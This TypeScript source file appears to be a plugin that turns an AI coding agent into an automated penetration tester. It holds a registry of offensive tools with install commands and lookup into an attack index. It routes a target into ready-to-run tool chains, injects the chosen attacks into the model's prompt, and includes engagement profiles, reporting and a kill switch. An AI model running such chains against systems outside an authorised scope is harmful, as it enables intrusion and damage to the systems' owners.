  gopherus: { go: "github.com/hatw/gopherus@latest" },
  commix: { pip: "commix" },
  lfimap: { pip: "lfimap" },
  exiftool: { apt: "libimage-exiftool-perl" },
  ysoserial: { git: "https://github.com/frohoff/ysoserial" },
  marshalsec: { git: "https://github.com/marshalsec/marshalsec" },
  fenix: { git: "https://github.com/0x727/Fenix" },
  jwt_tool: { git: "https://github.com/ticarpi/jwt_tool" },
  hashcat: { apt: "hashcat" },
  john: { apt: "john" },
  hydra: { apt: "hydra" },
  medusa: { apt: "medusa" },
  patator: { apt: "patator" },
  bettercap: { go: "github.com/bettercap/bettercap@latest" },
  burp: { apt: "burpsuite" },
  corscanner: { go: "github.com/OutOfLine/CorsScan@latest" },
  oralyzer: { pip: "oralyzer" },
  linpeas: { git: "https://github.com/peass-ng/PEASS-ng" },
  pspy: { git: "https://github.com/Dom97/PSPy" },
  winpeas: { git: "https://github.com/peass-ng/PEASS-ng" },
  netexec: { pip: "netexec" },
  impacket: { pip: "impacket" },
  bloodhound: { pip: "sharphound" },
  responder: { git: "https://github.com/lgandx/Responder" },
  chisel: { go: "github.com/jpillora/chisel@latest" },
  "ligolo-ng": { go: "github.com/nicocha30/ligolo-ng@latest" },
  pwncat: { pip: "pwncat" },
  gost: { go: "github.com/ginuerzh/gost@latest" },
  smbclient: { apt: "smbclient" },
  tshark: { apt: "tshark" },
  tcpdump: { apt: "tcpdump" },
  zeek: { apt: "zeek" },
  airmon: { apt: "airmon-ng" },
  aircrack: { apt: "aircrack-ng" },
  pwntools: { pip: "pwntools" },
  ROPgadget: { pip: "ROPgadget" },
  ropper: { pip: "ropper" },
  one_gadget: { git: "https://github.com/david942j/one_gadget" },
  capa: { pip: "flare-capa" },
  floss: { pip: "flare-floss" },
  yara: { apt: "yara" },
  ssdeep: { apt: "ssdeep" },
  binwalk: { pip: "binwalk" },
  unblob: { pip: "unblob" },
  apktool: { apt: "apktool" },
  jadx: { apt: "jadx" },
  searchsploit: { apt: "exploitdb" },
  grype: { go: "github.com/anchore/grype@latest" },
  "osv-scanner": { go: "github.com/google/osv-scanner/cmd/osv-scanner@latest" },
  subjack: { go: "github.com/haccer/subjack@latest" },
  s3scanner: { go: "github.com/sa7mon/s3scanner@latest" },
  cloud_enum: { go: "github.com/initstring/cloud_enum@latest" },
  trufflehog: { go: "github.com/trufflesecurity/trufflehog@latest" },
  gitleaks: { go: "github.com/gitleaks/gitleaks@latest" },
  semgrep: { pip: "semgrep" },
  wapiti: { pip: "wapiti3" },
  zap: { apt: "zaproxy" },
  graphql: { pip: "graphql-cop" },
  gqlscan: { go: "github.com/0xJazzy/gqlscan@latest" },
  inql: { pip: "inql" },
  kiterunner: { go: "github.com/assetnote/kiterunner@latest" },
  swagger: { npm: "@apidevtools/swagger-parser" },
  ldapsearch: { apt: "ldap-utils" },
  "gobuster-ftp": { apt: "gobuster" },
  strace: { apt: "strace" },
  ltrace: { apt: "ltrace" },
  gdb: { apt: "gdb" },
  lldb: { apt: "lldb" },
  binutils: { apt: "binutils" },
  file: { apt: "file" },
  pandoc: { apt: "pandoc" },
  frida: { pip: "frida-tools" },
  awscli: { pip: "awscli" },
  objdump: { apt: "binutils" },
  readelf: { apt: "binutils" },
  strings: { apt: "binutils" },
  curl: { apt: "curl" },
  ssh: { apt: "openssh-client" },
  socat: { apt: "socat" },
  dig: { apt: "dnsutils" },
}

/* -------- extended toolchain registry (~/.raptor/tool-registry.json) --------
 * The registry is the single source of truth for the newer tool families
 * (cloud/k8s/container/forensics/crypto/osint-bugbounty/symbolic/fuzzing).
 * It is merged into TOOL_SPECS so raptor_doctor, raptor_route and
 * raptor_kali all see every registered tool without a code change.
 * ------------------------------------------------------------------------- */
type RegistryEntry = { bin: string; cat: string; desc: string; install?: Install; alt?: string }
let EXTENDED_TOOLS: RegistryEntry[] = []
try {
  const reg = readJSON(join(BASE, "tool-registry.json"), null) as Json
  if (reg && Array.isArray(reg.tools)) {
    EXTENDED_TOOLS = reg.tools as RegistryEntry[]
    for (const t of EXTENDED_TOOLS) {
      if (t && t.bin) TOOL_SPECS[t.bin] = t.install || {}
    }
  }
} catch {}

function registryEntry(bin: string): RegistryEntry | null {
  return EXTENDED_TOOLS.find((t) => t.bin === bin) || null
}

function installCommand(spec: Install, bin?: string): string | null {
  if (spec.go) return `go install ${spec.go}`
  if (spec.pip) return `pip install --quiet --break-system-packages ${spec.pip}`
  if (spec.apt) return `apt-get install -y ${spec.apt}`
  if (spec.cargo) return `cargo install ${spec.cargo}`
  if (spec.git) return `git clone --depth 1 ${spec.git} ~/.raptor/tools/${bin || slug(spec.git || "tool")}`
  if (spec.npm) return `npm install -g ${spec.npm}`
  if (spec.gem) return `gem install --no-document ${spec.gem}`
  if (spec.release_gh) {
    const name = spec.release_gh.repo.split("/")[1] || bin || "tool"
    return `bash ~/.raptor/install-tools.sh --only ${name}`
  }
  if (spec.url) return `curl -fsSL ${spec.url} -o ${spec.dest || `~/.raptor/tools/${bin || "tool"}`}`
  if (spec.local) {
    const path = spec.local.startsWith("/") ? spec.local : join(BASE, "tools", "local", spec.local)
    if (existsSync(path)) return null // shipped locally, nothing to install
    return `missing shipped artefact at ${path}`
  }
  return null
}

/* ------------------------------------------------------------ Kali inventory */

type KaliInv = {
  total: number
  byCat: Record<string, string[]>
  index: Record<string, { cat: string; desc: string }>
  dirs: string[]
}

let kaliCache: KaliInv | null = null
let kaliCacheAt = 0

function kaliInventory(): KaliInv {
  // refresh every 60s so newly installed tools appear without a plugin reload
  if (kaliCache && Date.now() - kaliCacheAt < 60_000) return kaliCache
  kaliCacheAt = Date.now()
  const catPath = join(BASE, "kali-catalog.json")
  let classes: Array<{ pattern: string; flags: string; cat: string; desc: string }> = []
  let dirs: string[] = ["/usr/bin", "/usr/sbin", "/usr/local/bin", "/usr/local/sbin", "/opt", "/usr/share/nmap/scripts", "/usr/share/seclists"]
  try {
    const raw = JSON.parse(readFileSync(catPath, "utf8"))
    classes = raw.classes || []
    dirs = raw.dirs || dirs
  } catch {}
  const compiled = classes.map((c) => ({ re: new RegExp(c.pattern, c.flags || ""), cat: c.cat, desc: c.desc }))
  const byCat: Record<string, string[]> = {}
  const index: Record<string, { cat: string; desc: string }> = {}
  let total = 0
  for (const dir of dirs) {
    let names: string[] = []
    try {
      names = readdirSync(dir)
    } catch {
      continue
    }
    for (const name of names) {
      if (name.startsWith(".")) continue
      if (index[name]) continue
      for (const c of compiled) {
        if (c.re.test(name)) {
          ;(byCat[c.cat] ||= []).push(name)
          index[name] = { cat: c.cat, desc: c.desc }
          total++
          break
        }
      }
    }
  }
  for (const t of EXTENDED_TOOLS) {
    if (!t || !t.bin || index[t.bin]) continue
    const cat = t.cat || "extended"
    const desc = t.desc || "extended toolchain tool"
    ;(byCat[cat] ||= []).push(t.bin)
    index[t.bin] = { cat, desc }
    total++
  }
  kaliCache = { total, byCat, index, dirs }
  return kaliCache
}

function kaliSearch(query: string): Json {
  const inv = kaliInventory()
  const q = query.toLowerCase().trim()
  if (!q) {
    return {
      ok: true,
      total_classified: inv.total,
      categories: Object.fromEntries(Object.entries(inv.byCat).map(([k, v]) => [k, v.length])),
      hint: "Pass a keyword to narrow it down, e.g. 'sql', 'hash', 'smb', 'wifi', 'fuzz', 'osint'.",
      sample: Object.fromEntries(Object.entries(inv.byCat).slice(0, 12).map(([k, v]) => [k, v.slice(0, 12)])),
    }
  }
  const hits: Json[] = []
  for (const [tool, meta] of Object.entries(inv.index)) {
    const t = tool.toLowerCase()
    if (t.includes(q) || q.includes(t) || meta.cat.toLowerCase().includes(q) || meta.desc.toLowerCase().includes(q)) {
      hits.push({ tool, category: meta.cat, purpose: meta.desc, installed: which(tool) })
    }
  }
  hits.sort((a, b) => Number(b.installed) - Number(a.installed))
  return { ok: true, query, total_classified: inv.total, hits: hits.slice(0, 80), count: hits.length }
}

/* ------------------------------------------------------ master attack index */

const MASTER_INDEX = "/hacking/references/master-attacks.json"
const MASTER_MD = "/hacking/references/master-attack-index.md"

let masterCache: Json | null = null

/** Extract the operator's latest message text from the model-call message list. */
function lastUserText(messages: any): string {
  if (!Array.isArray(messages)) return ""
  for (let i = messages.length - 1; i >= 0; i--) {
    const m = messages[i]
    if (!m || (m.role && m.role !== "user")) continue
    const parts = m.parts || []
    const txt = parts
      .filter((p: Json) => p && p.type === "text" && typeof p.text === "string")
      .map((p: Json) => p.text)
      .join(" ")
      .trim()
    if (txt) return txt.slice(0, 1200)
  }
  return ""
}

function loadMaster(): Json | null {
  if (masterCache) return masterCache
  try {
    masterCache = JSON.parse(readFileSync(MASTER_INDEX, "utf8"))
  } catch {
    masterCache = null
  }
  return masterCache
}

function attackLookup(query: string, category: string, limit: number): Json {
  const m = loadMaster()
  if (!m) {
    return {
      ok: false,
      error: `master attack index not found at ${MASTER_INDEX}`,
      rebuild: "python3 ~/.config/opencode/skills/toolsmith/scripts/build_master_index.py",
      raw_reference: MASTER_MD,
    }
  }
  const q = query.toLowerCase().trim()
  const catQ = category.toLowerCase().trim()

  let pool = m.attacks as Json[]
  if (catQ) pool = pool.filter((a) => (a.category || "").toLowerCase().includes(catQ))

  const score = (a: Json): number => {
    const name = (a.name || "").toLowerCase()
    const id = (a.id || "").toLowerCase()
    const al: string[] = a.aliases || []
    const kw: string[] = a.keywords || []
    let s = 0
    if (!q) s = 1
    else {
      if (name === q) s += 100
      else if (name.startsWith(q)) s += 60
      else if (name.includes(q)) s += 40
      if (id === q.replace(/[^a-z0-9]/g, "")) s += 70
      if (al.some((x) => x.toLowerCase() === q)) s += 90
      else if (al.some((x) => x.toLowerCase().includes(q))) s += 55
      if (kw.includes(q)) s += 30
      // token overlap
      const qt = q.split(/[^a-z0-9]+/).filter((w) => w.length > 2)
      const hit = qt.filter((w) => kw.includes(w) || name.includes(w)).length
      if (hit) s += hit * 12
    }
    return s
  }

  const scored = pool
    .map((a) => ({ a, s: score(a) }))
    .filter((x) => x.s > 0)
    .sort((x, y) => y.s - x.s)
    .slice(0, limit)

  if (!scored.length) {
    return {
      ok: true,
      query,
      total_in_index: m.total,
      matches: 0,
      hint: "No direct match. Use raptor_kali(query=...) for a tool, or search the raw index at " + MASTER_MD,
      categories: m.categories,
    }
  }

  const refs = Array.from(new Set(scored.map((x) => x.a.reference)))
  const routes = Array.from(new Set(scored.map((x) => x.a.route)))
  const skills = Array.from(new Set(scored.map((x) => x.a.skill)))

  return {
    ok: true,
    query,
    total_in_index: m.total,
    matches: scored.length,
    // what to load and what to run
    load_skills: skills,
    load_references: refs,
    suggested_routes: routes,
    next: [
      `load skill(s): ${skills.join(", ")}`,
      `load reference(s): ${refs.join(", ")}`,
      `raptor_route(intent='${routes[0]}') to get the exact toolchain`,
      "execute, verify, then raptor_finding + raptor_report",
    ],
    attacks: scored.map((x) => ({
      name: x.a.name,
      category: x.a.category,
      skill: x.a.skill,
      reference: x.a.reference,
      route: x.a.route,
      tools: x.a.tools,
      verify: x.a.verify,
      aliases: (x.a.aliases || []).slice(0, 6),
      score: x.s,
    })),
  }
}

/* -------------------------------------------------------------- tool router */

function route(intent: string, target: string, vars: Json): Json {
  const key = intent.toLowerCase().trim().replace(/[\s_]+/g, "-")
  const r = ROUTES[key]
  if (!r) {
    // 1. direct tool name? e.g. intent="nmap" -> run it
    const inv = kaliInventory()
    if (inv.index[intent.trim()]) {
      const meta = inv.index[intent.trim()]
      return {
        ok: true,
        intent: intent.trim(),
        phase: "ops",
        goal: meta.desc,
        direct_tool: true,
        target: target || null,
        chain: [
          {
            tool: intent.trim(),
            available: which(intent.trim()),
            cmd: `${intent.trim()} ${target ? target : ""}`.trim(),
            install: null,
            alternative: null,
          },
        ],
        ready_to_run: which(intent.trim()) ? [`${intent.trim()} ${target || ""}`.trim()] : [],
        category: meta.cat,
        notes: [`${intent.trim()} -> ${meta.desc} (category: ${meta.cat})`],
      }
    }
    // 2. fuzzy search across the whole Kali inventory
    const hits = kaliSearch(intent).hits || []
    const keys = Object.keys(ROUTES).sort()
    return {
      ok: false,
      error: `Unknown intent "${intent}".`,
      available_intents: keys,
      kali_matches: hits.slice(0, 25),
      hint: "Call raptor_route with a curated intent, a raw tool name, or use raptor_kali to search the full Kali inventory.",
    }
  }
  const subst = (s: string) =>
    s.replace(/\{(\w+)\}/g, (_m, k) => {
      if (k === "target") return target || "<TARGET>"
      if (k === "out") return String((vars && vars.out) || "/tmp/opencode/raptor")
      if (vars && vars[k] != null) return String(vars[k])
      return `{${k}}`
    })

  const chain = r.tools.map((t) => {
    const available = which(t.bin)
    const spec = TOOL_SPECS[t.bin] || t.install
    return {
      tool: t.bin,
      available,
      cmd: subst(t.cmd),
      install: available ? null : spec ? installCommand(spec, t.bin) : null,
      alternative: available ? null : t.alt || null,
    }
  })

  const usable = chain.filter((c) => c.available)
  return {
    ok: true,
    intent: key,
    phase: r.phase,
    goal: r.goal,
    target: target || null,
    primary: usable[0] || null,
    chain,
    ready_to_run: usable.map((c) => c.cmd),
    install_first: chain.filter((c) => !c.available && c.install).map((c) => ({ tool: c.tool, install: c.install })),
    notes: r.notes || [],
    stop_condition: r.stop || null,
  }
}

/* ----------------------------------------------------------------- doctor */

function doctor(install: boolean): Json {
  const entries = Object.entries(TOOL_SPECS).map(([bin, spec]) => ({ tool: bin, present: which(bin) }))
  const missing = entries.filter((e) => !e.present)
  const logPath = join(BASE, "install.log")
  const result: Json = {
    ok: true,
    total: entries.length,
    present: entries.length - missing.length,
    missing: missing.map((m) => m.tool),
    install_plan: missing.map((m) => ({ tool: m.tool, install: installCommand(TOOL_SPECS[m.tool], m.tool) })),
  }
  if (existsSync(logPath)) {
    try {
      const tail = readFileSync(logPath, "utf8").split("\n").filter(Boolean).slice(-25)
      result.install_log_tail = tail
      result.installer_running = !tail.some((l) => l.includes("install-tools done")) && !tail.some((l) => l.includes("install-tools start"))
    } catch {}
  }
  const inv = kaliInventory()
  result.kali_inventory = {
    classified_tools: inv.total,
    categories: Object.fromEntries(Object.entries(inv.byCat).map(([k, v]) => [k, v.length])),
    hint: "Use raptor_kali(query=...) to search it.",
  }
  if (install) {
    const log: Json[] = []
    const script = join(BASE, "install-tools.sh")
    if (!existsSync(script)) {
      result.error = `installer script missing: ${script}`
      return result
    }
    // run detached so a 20-minute toolchain build never blocks the agent loop
    const child = spawn("/bin/bash", [script], { detached: true, stdio: "ignore" })
    child.unref()
    result.install_started = true
    result.pid = child.pid
    result.log = join(BASE, "install.log")
    result.hint = "Installer running in the background. Poll raptor_doctor() again to watch progress; it reports the install log tail and the current present/missing counts."
    return result
  }
  return result
}

/* ------------------------------------------------------------ engagement */

function engage(input: Json): Json {
  const target = (input.target || "").trim()
  if (!target) {
    return { ok: false, error: "target is required. Call raptor_engage with the target string (host, URL, CIDR, repo path, or binary path)." }
  }
  const profile = input.profile || "full"
  const stamp = new Date().toISOString().replace(/[:.]/g, "-")
  const dir = join(ENG_DIR, `${slug(target)}-${stamp}`)
  ensureDir(dir)
  ensureDir(join(dir, "evidence"))
  ensureDir(join(dir, "raw"))
  ensureDir(BASE)

  const state = {
    id: `${slug(target)}-${stamp}`,
    target,
    profile,
    objective: input.objective || "full attack-surface discovery, vulnerability validation and proof",
    scope: input.scope || [],
    created_at: nowISO(),
    updated_at: nowISO(),
    phase: "plan",
    phases_done: [],
    hypotheses: [],
    findings: 0,
    confirmed: 0,
    tool_log: [],
    decisions: [],
    open_questions: [],
    surface: { hosts: [], endpoints: [], files: [], secrets: [] },
    notes: input.notes || "",
  }
  saveState(dir, state)
  writeFileSync(join(BASE, "active"), dir)
  appendFileSync(
    MEMORY,
    `\n## ${state.id}\n- target: ${target} | profile: ${profile}\n- objective: ${state.objective}\n`,
  )

  return {
    ok: true,
    engagement: state.id,
    workspace: dir,
    layout: {
      state: join(dir, "state.json"),
      findings: join(dir, "findings.jsonl"),
      evidence: join(dir, "evidence"),
      raw: join(dir, "raw"),
      memory: MEMORY,
    },
    next: [
      "raptor_doctor() — confirm the toolchain for this target type",
      "raptor_route(intent='target-fingerprint') — fingerprint the target before anything else",
      "raptor_state(set={phase:'recon'}) — record the phase transition",
    ],
    profile_note:
      profile === "stealth"
        ? "Stealth: low request rate, no noise generators, single-host at a time."
        : profile === "friendly"
          ? "Friendly: proof-of-concept only, never destructive, target left healthy and logs clean."
          : profile === "red"
            ? "Red: full chain authorised, destructive steps allowed, snapshot first."
            : "Full: complete exploitation chain, proof-first, destructive steps require an explicit operator go in the current turn.",
  }
}

/* ---------------------------------------------------------------- findings */

function addFinding(dir: string, f: Json): Json {
  const id = `F-${Date.now().toString(36).toUpperCase()}`
  const rec = {
    id,
    title: f.title,
    severity: (f.severity || "info").toLowerCase(),
    category: f.category || "general",
    endpoint: f.endpoint || null,
    cvss: f.cvss ?? null,
    cve: f.cve || null,
    evidence: f.evidence || "",
    poc: f.poc || "",
    impact: f.impact || "",
    fix: f.fix || "",
    confirmed: f.confirmed !== false,
    created_at: nowISO(),
  }
  appendFileSync(join(dir, "findings.jsonl"), JSON.stringify(rec) + "\n")
  const st = loadState(dir)
  st.findings = (st.findings || 0) + 1
  if (rec.confirmed) st.confirmed = (st.confirmed || 0) + 1
  saveState(dir, st)
  return { ok: true, id, finding: rec, count: st.findings }
}

/* ------------------------------------------------------------------ report */

/* ---------------------------------------------------------------- todos */

function todosOf(dir: string): Json[] {
  const st = loadState(dir)
  return Array.isArray(st.todos) ? st.todos : []
}

function saveTodos(dir: string, list: Json[]) {
  const st = loadState(dir)
  st.todos = list
  saveState(dir, st)
}

function todoMutate(
  dir: string,
  action: string,
  opts: { id?: string; text?: string; status?: string; result?: string } = {},
): Json {
  const now = nowISO()
  let list = todosOf(dir)
  if (action === "clear") {
    saveTodos(dir, [])
    return { ok: true, cleared: list.length }
  }
  if (action === "add") {
    const id = opts.id || `T${list.filter((t) => String(t.id || "").startsWith("T")).length + 1}-${Date.now() % 10000}`
    const item = {
      id,
      text: opts.text || "",
      status: "open",
      created_at: now,
      updated_at: now,
      result: null,
    }
    list.push(item)
    saveTodos(dir, list)
    return { ok: true, todo: item }
  }
  const item = list.find((t) => t.id === opts.id)
  if (!item) return { ok: false, error: `todo '${opts.id}' not found` }
  if (["open", "doing", "done", "blocked", "dropped"].includes(opts.status || "")) item.status = opts.status
  if (opts.text) item.text = opts.text
  if (opts.result != null) item.result = opts.result
  item.updated_at = now
  saveTodos(dir, list)
  return { ok: true, todo: item }
}

function todoBoard(dir: string): Json {
  const list = todosOf(dir)
  const by = (s: string) => list.filter((t) => t.status === s)
  return {
    ok: true,
    open: by("open").length,
    doing: by("doing").length,
    done: by("done").length,
    blocked: by("blocked").length,
    items: list,
    next_action: list.find((t) => t.status === "doing") || by("open")[0] || null,
  }
}

/* ----------------------------------------------------------- kill switch */

function stopFlagPath() {
  return join(BASE, "STOP")
}

function stopRequested(): boolean {
  const p = stopFlagPath()
  if (!existsSync(p)) return false
  try {
    // auto-expire after 6h so one forgotten flag does not brick a future run
    return Date.now() - statSync(p).mtimeMs < 6 * 3600_000
  } catch {
    return false
  }
}

function requestStop(reason: string): Json {
  ensureDir(BASE)
  writeFileSync(stopFlagPath(), `${nowISO()} | ${reason}\n`, { mode: 0o600 })
  let tmux: Json = { attempted: false }
  if (which("tmux")) {
    try {
      const sessions = execFileSync("tmux", ["ls", "-F", "#S"], { encoding: "utf8", stdio: ["pipe", "pipe", "pipe"] }).split("\n").filter(Boolean)
      const mine = sessions.filter((s) => s.startsWith("raptor-"))
      const killed: string[] = []
      for (const s of mine) {
        try {
          // politely interrupt, then die
          execFileSync("tmux", ["send-keys", "-t", s, "C-c"], { stdio: ["ignore", "ignore", "ignore"] })
          execFileSync("bash", ["-c", `sleep 0.3; tmux kill-session -t ${s}`])
          killed.push(s)
        } catch {}
      }
      tmux = { attempted: true, sessions_seen: sessions.length, killed }
    } catch (e) {
      tmux = { attempted: true, error: String(e) }
    }
  }
  return { ok: true, stop_flag: stopFlagPath(), reason, tmux, note: "All raptor tmux sessions killed; STOP flag is live for 6h. Check it before any new long-running step." }
}

function clearStop(): Json {
  try {
    unlinkSync(stopFlagPath())
    return { ok: true, cleared: stopFlagPath() }
  } catch {
    return { ok: true, cleared: `${stopFlagPath()} (was not set)` }
  }
}

/* ------------------------------------------------------- tmux orchestrator */

type PaneSpec = { window: string; cmd: string }

function tmuxSessionName(target: string): string {
  return `raptor-${slug(target) || "sess"}`
}

function tmux(...args: string[]): string {
  return execFileSync("tmux", args, { encoding: "utf8", stdio: ["pipe", "pipe", "pipe"] }).trim()
}

function tmuxSession(name: string): boolean {
  try {
    tmux("has-session", "-t", name)
    return true
  } catch {
    return false
  }
}

function tmuxStart(name: string, workdir: string, panes: PaneSpec[]): Json {
  if (!which("tmux")) return { ok: false, error: "tmux not installed (apt-get install -y tmux)" }
  if (tmuxSession(name)) return { ok: true, session: name, existed: true, hint: `tmux attach -t ${name}` }
  try {
    tmux("new-session", "-d", "-s", name, "-c", workdir, "-n", panes[0].window)
    // prepare the run log the `logs` window tails
    ensureDir(workdir)
    for (const p of panes.slice(1)) tmux("new-window", "-t", name, "-n", p.window, "-c", workdir)
    for (const p of panes) tmux("send-keys", "-t", `${name}:${p.window}`, p.cmd, "Enter")
    return { ok: true, session: name, windows: panes.map((p) => p.window), hint: `tmux attach -t ${name}` }
  } catch (e) {
    return { ok: false, error: String(e) }
  }
}

function tmuxDispatch(name: string, win: string, cmd: string): Json {
  if (!tmuxSession(name)) return { ok: false, error: `session ${name} is not up (raptor_tmux action=start first)` }
  try {
    tmux("send-keys", "-t", `${name}:${win}`, cmd, "Enter")
    return { ok: true, sent: cmd, window: win }
  } catch (e) {
    return { ok: false, error: String(e) }
  }
}

function tmuxCapture(name: string, win: string, lines: number): Json {
  if (!tmuxSession(name)) return { ok: false, error: `session ${name} is not up` }
  try {
    const out = tmux("capture-pane", "-p", "-t", `${name}:${win}`, "-S", String(-lines))
    return { ok: true, window: win, lines: out.split("\n").length, output: out }
  } catch (e) {
    return { ok: false, error: String(e) }
  }
}

function tmuxList(): Json {
  if (!which("tmux")) return { ok: false, error: "tmux not installed" }
  try {
    const raw = tmux("ls")
    const sessions = raw.split("\n").filter(Boolean).map((l) => {
      const m = l.match(/^(raptor-[^:]+):/)
      return { raw: l, is_raptor: !!m }
    })
    return { ok: true, sessions, raptor_sessions: sessions.filter((s) => s.is_raptor).map((s) => s.raw) }
  } catch {
    return { ok: true, sessions: [], raptor_sessions: [], note: "no tmux server running" }
  }
}

function tmuxStop(name: string): Json {
  if (!which("tmux")) return { ok: false, error: "tmux not installed" }
  const targets = name === "*" ? tmuxList().raptor_sessions || [] : [name]
  const killed: string[] = []
  for (const t of targets as string[]) {
    const sess = String(t).split(":")[0].split(" ")[0]
    try {
      tmux("send-keys", "-t", sess, "C-c")
      execFileSync("bash", ["-c", `sleep 0.3 && tmux kill-session -t ${sess} 2>/dev/null || true`], { stdio: "ignore" })
      killed.push(sess)
    } catch {}
  }
  return { ok: true, killed }
}

/* -------------------------------------------- reusable attack-chain patterns */

const PATTERNS_DIR = join(BASE, "patterns")

function patternLoadAll(): Json[] {
  ensureDir(PATTERNS_DIR)
  try {
    return readdirSync(PATTERNS_DIR)
      .filter((f) => f.endsWith(".json"))
      .map((f) => ({ ...(readJSON(join(PATTERNS_DIR, f), {}) as Json), _file: f }))
      .filter((p) => p && p.id)
  } catch {
    return []
  }
}

function patternSave(p: Json): Json {
  ensureDir(PATTERNS_DIR)
  if (!p.id) p.id = `pattern-${Date.now().toString(36)}`
  p.created_at = p.created_at || nowISO()
  writeJSON(join(PATTERNS_DIR, `${p.id}.json`), p)
  return p
}

function patternMatches(p: Json, ctx: Json): boolean {
  const m = p.match || {}
  for (const [k, want] of Object.entries(m)) {
    const got = String((ctx as Json)[k] ?? "").toLowerCase()
    if (!got) continue
    const w = String(want).toLowerCase()
    if (!got.includes(w) && !w.split("|").some((x) => got.includes(x.trim()))) return false
  }
  return true
}

function buildReport(dir: string, format: string): Json {
  const st = loadState(dir)
  let findings: Json[] = []
  try {
    findings = readFileSync(join(dir, "findings.jsonl"), "utf8")
      .split("\n")
      .filter(Boolean)
      .map((l) => {
        try {
          return JSON.parse(l)
        } catch {
          return null
        }
      })
      .filter(Boolean)
  } catch {}
  const order = { critical: 0, high: 1, medium: 2, low: 3, info: 4 }
  findings.sort((a, b) => (order[a.severity] ?? 9) - (order[b.severity] ?? 9))
  const counts = findings.reduce((acc: Json, f: Json) => {
    acc[f.severity] = (acc[f.severity] || 0) + 1
    return acc
  }, {})

  const md = [
    `# Raptor Report — ${st.target || "target"}`,
    ``,
    `- engagement: \`${st.id || "n/a"}\``,
    `- profile: ${st.profile || "full"}`,
    `- generated: ${nowISO()}`,
    `- findings: ${findings.length} (${JSON.stringify(counts)})`,
    ``,
    `## Executive summary`,
    ``,
    findings.length
      ? `Confirmed issues on \`${st.target}\`: ${Object.entries(counts).map(([k, v]) => `${v} ${k}`).join(", ")}.`
      : `No confirmed findings were recorded for this target.`,
    ``,
    `## Attack surface`,
    ``,
    `- hosts: ${(st.surface?.hosts || []).length}`,
    `- endpoints: ${(st.surface?.endpoints || []).length}`,
    `- files discovered: ${(st.surface?.files || []).length}`,
    `- secrets surfaced: ${(st.surface?.secrets || []).length}`,
    ``,
    `## Execution timeline (todo-driven)`,
    ``,
    ...(st.todos || []).length
      ? (st.todos as Json[]).map(
          (t) =>
            `- [${t.status?.toUpperCase() || "OPEN"}] ${t.id}: ${t.text}` +
            (t.result ? `\n  ↳ result: ${String(t.result).slice(0, 300)}` : ""),
        )
      : ["- (no todo plan was recorded for this engagement)"],
    ``,
    `## Honesty ledger`,
    ``,
    `- confirmed findings: ${findings.filter((f) => f.confirmed).length} (evidence-backed)`,
    `- candidate-only findings: ${findings.filter((f) => !f.confirmed).length} (reported as unproven)`,
    `- every confirmed claim above has a file in \`evidence/\` or a \`Reproduction\` block.`,
    ``,
    `## Findings`,
    ``,
    ...findings.flatMap((f) => [
      `### [${f.severity.toUpperCase()}] ${f.id} — ${f.title}`,
      ``,
      `- category: ${f.category}`,
      f.endpoint ? `- endpoint: \`${f.endpoint}\`` : "",
      f.cvss != null ? `- cvss: ${f.cvss}` : "",
      f.cve ? `- cve: ${f.cve}` : "",
      `- confirmed: ${f.confirmed ? "yes (evidence-backed)" : "candidate only"}`,
      ``,
      f.impact ? `**Impact**\n\n${f.impact}\n` : "",
      f.evidence ? `**Evidence**\n\n\`\`\`\n${f.evidence}\n\`\`\`\n` : "",
      f.poc ? `**Reproduction**\n\n\`\`\`\n${f.poc}\n\`\`\`\n` : "",
      f.fix ? `**Fix**\n\n${f.fix}\n` : "",
      ``,
    ]),
  ]
    .filter((l) => l !== "")
    .join("\n")

  const mdPath = join(dir, "report.md")
  writeFileSync(mdPath, md)
  const wantJson = format === "json" || format === "both"
  if (wantJson) writeJSON(join(dir, "report.json"), { state: st, counts, findings })
  return { ok: true, report: mdPath, json: wantJson ? join(dir, "report.json") : null, counts, findings: findings.length }
}

/* -------------------------------------------------------------- recon diff */

function reconDiff(dir: string): Json {
  const st = loadState(dir)
  const prevPath = join(dir, "surface.snapshot.json")
  const prev = readJSON(prevPath, { hosts: [], endpoints: [], files: [], secrets: [] })
  const cur = st.surface || { hosts: [], endpoints: [], files: [], secrets: [] }
  const diff = (a: string[], b: string[]) => ({
    added: b.filter((x) => !a.includes(x)),
    removed: a.filter((x) => !b.includes(x)),
  })
  const out = {
    ok: true,
    first_run: Object.values(prev).every((v: any) => Array.isArray(v) && v.length === 0),
    hosts: diff(prev.hosts || [], cur.hosts || []),
    endpoints: diff(prev.endpoints || [], cur.endpoints || []),
    files: diff(prev.files || [], cur.files || []),
    secrets: diff(prev.secrets || [], cur.secrets || []),
  }
  writeJSON(prevPath, cur)
  return out
}

/* ------------------------------------------------------------------ plugin */

export default {
  id: "raptor",
  async setup(ctx: Json) {
    ensureDir(BASE)
    ensureDir(ENG_DIR)

    /* inject engagement state + resolved attack selection into the model call */
    await ctx.session.hook("context", (event: Json) => {
      if (event.agent !== AGENT_ID) return

      // 1. resolve the operator's latest requirement against the master attack index
      const req = lastUserText(event.messages)
      const sel = req ? attackLookup(req, "", 3) : null
      if (sel && (sel as Json).ok && (sel as Json).matches) {
        const s = sel as Json
        const lines = (s.attacks as Json[])
          .map((a) => `  - ${a.name}  [skill=${a.skill} ref=${a.reference} route=${a.route}]`)
          .join("\n")
        event.system.push({
          type: "text",
          text:
            `<attack-selection>` +
            `requirement: "${req}"` +
            `\nmatched from the master index (${s.total_in_index} techniques):` +
            `\n${lines}` +
            `\nload: ${(s.load_skills as string[]).join(", ")} | ${(s.load_references as string[]).join(", ")}` +
            `\nroute: ${(s.suggested_routes as string[])[0]}` +
            `\n</attack-selection>`,
        })
      }

      // 2. engagement state
      const dir = activeEngagementDir()
      if (!dir) return
      const st = loadState(dir)
      if (!st || !st.id) return
      let findings: Json[] = []
      try {
        findings = readFileSync(join(dir, "findings.jsonl"), "utf8").split("\n").filter(Boolean).map((l) => { try { return JSON.parse(l) } catch { return null } }).filter(Boolean)
      } catch {}
      const surface = st.surface || {}
      const block = [
        `<raptor-state>`,
        `engagement: ${st.id}`,
        `target: ${st.target}`,
        `profile: ${st.profile}`,
        `objective: ${st.objective}`,
        `phase: ${st.phase} | done: ${(st.phases_done || []).join(", ") || "none"}`,
        `findings: ${findings.length} (confirmed ${st.confirmed || 0})`,
        surface.hosts?.length ? `hosts: ${surface.hosts.length}` : null,
        surface.endpoints?.length ? `endpoints: ${surface.endpoints.length}` : null,
        surface.secrets?.length ? `secrets: ${surface.secrets.length}` : null,
        st.hypotheses?.length ? `open hypotheses:\n${(st.hypotheses || []).map((h: Json) => `  - ${h.hypothesis || h}`).join("\n")}` : null,
